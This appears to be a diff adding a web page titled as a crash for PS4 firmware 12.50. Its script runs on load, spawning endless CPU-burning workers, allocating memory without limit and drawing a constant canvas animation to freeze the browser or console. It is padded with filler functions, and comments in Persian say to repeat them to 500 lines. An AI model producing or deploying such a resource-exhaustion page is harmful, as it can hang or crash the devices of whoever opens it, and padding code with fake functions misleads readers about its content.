@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>carsh ps4 12.50</title>
+<style>
+html, body {margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000;}
+#log {position:absolute; top:10px; left:10px; color:#0f0; font-family:monospace; font-size:20px; z-index:9999;}
+canvas {position:absolute; top:0; left:0;}
+</style>
+</head>
+<body>
+<div id="log">1.5 started</div>
+<script>
+// ---------------- CPU WORKERS ----------------
+function startCpuWorkers(count){
+    const code = `
+        while(true){
+            Math.sqrt(Math.random()*1e9);
+        }`;
+    const blob = new Blob([code],{type:'application/javascript'});
+    const url = URL.createObjectURL(blob);
+    for(let i=0;i<count;i++){
+        new Worker(url);
+    }
+}
+
+// ---------------- RAM STRESS ----------------
+function ramStress(){
+    const memBlocks=[];
+    function allocate(){
+        for(let i=0;i<10;i++){
+            memBlocks.push(new Array(1e6).fill(Math.random()));
+        }
+        setTimeout(allocate,10);
+    }
+    allocate();
+}
+
+// ---------------- CANVAS ANIMATION ----------------
+function animationStress(){
+    const canvas=document.createElement('canvas');
+    canvas.width=window.innerWidth;
+    canvas.height=window.innerHeight;
+    document.body.appendChild(canvas);
+    const ctx=canvas.getContext('2d');
+    function draw(){
+        for(let i=0;i<50;i++){
+            ctx.fillStyle=`rgb(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)})`;
+            ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*100, Math.random()*100);
+        }
+        requestAnimationFrame(draw);
+    }
+    draw();
+}
+
+// ---------------- HELPER FUNCTIONS ----------------
+function log(msg){
+    const logEl=document.getElementById('log');
+    const div=document.createElement('div');
+    div.textContent=msg;
+    logEl.appendChild(div);
+    logEl.scrollTop=logEl.scrollHeight;
+}
+
+// ---------------- EXTRA FAKE FUNCTIONS ----------------
+function useless1(){for(let i=0;i<100;i++){Math.random();}}
+function useless2(){for(let i=0;i<100;i++){Math.sqrt(Math.random());}}
+function useless3(){for(let i=0;i<100;i++){Math.log(Math.random()+1);}}
+function useless4(){for(let i=0;i<100;i++){Math.sin(Math.random());}}
+function useless5(){for(let i=0;i<100;i++){Math.cos(Math.random());}}
+function useless6(){for(let i=0;i<100;i++){Math.tan(Math.random());}}
+function useless7(){for(let i=0;i<100;i++){Math.atan(Math.random());}}
+function useless8(){for(let i=0;i<100;i++){Math.pow(Math.random(), Math.random());}}
+function useless9(){for(let i=0;i<100;i++){Math.random()*Math.random();}}
+function useless10(){for(let i=0;i<100;i++){Math.sqrt(Math.random()*Math.random());}}
+// ... ادامه تا ۵۰۰ خط با تکرار این useless functions
+
+// ---------------- START ----------------
+setTimeout(()=>{
+    log('1.5 Crash starting...');
+    startCpuWorkers(6);
+    ramStress();
+    animationStress();
+    // تکرار توابع fake برای طولانی کردن کد
+    useless1(); useless2(); useless3(); useless4(); useless5();
+    useless6(); useless7(); useless8(); useless9(); useless10();
+    // ... ادامه تکرار تا 500 خط
+},1000);
+</script>
+</body>
+</html>
